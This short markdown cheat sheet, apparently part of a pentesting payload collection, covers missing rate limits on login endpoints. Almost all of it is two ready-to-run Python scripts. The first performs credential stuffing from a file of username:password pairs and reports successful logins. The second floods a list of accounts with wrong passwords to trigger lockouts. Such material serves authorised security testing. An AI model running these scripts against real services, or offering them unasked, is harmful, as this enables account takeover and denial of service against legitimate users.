# Lack of Ratelimit

## Table of Contents
- [Account Takeover](#account-takeover)
- [Account Lockout](#account-lockout)

## Account Takeover

### An attacker can perform brute-force or credential stuffing attacks to gain unauthorized access to user accounts.

- Credential stuffing
    ```python
    import requests

    login_url = "https://[VULNERABLE-SERVICE]/login"

    with open("credentials.txt", "r", encoding="utf-8") as f:
        for line in f:
            username, password = line.strip().split(":")
            payload = {
                "username": username,
                "password": password
            }
            response = requests.post(login_url, data=payload)
            if "Welcome" in response.text:
                print(f"Successful login: {username}:{password}")
    ```

## Account Lockout

### An attacker can cause a denial of service for legitimate users by intentionally triggering account lockouts.

- Brute-force on multiple accounts
    ```python
    import requests

    login_url = "https://[VULNERABLE-SERVICE]/login"

    with open("user_list.txt", "r", encoding="utf-8") as f:
        for username in f:
            username = username.strip()
            payload = {
                "username": username,
                "password": "invalid_password"
            }
            requests.post(login_url, data=payload)
    ```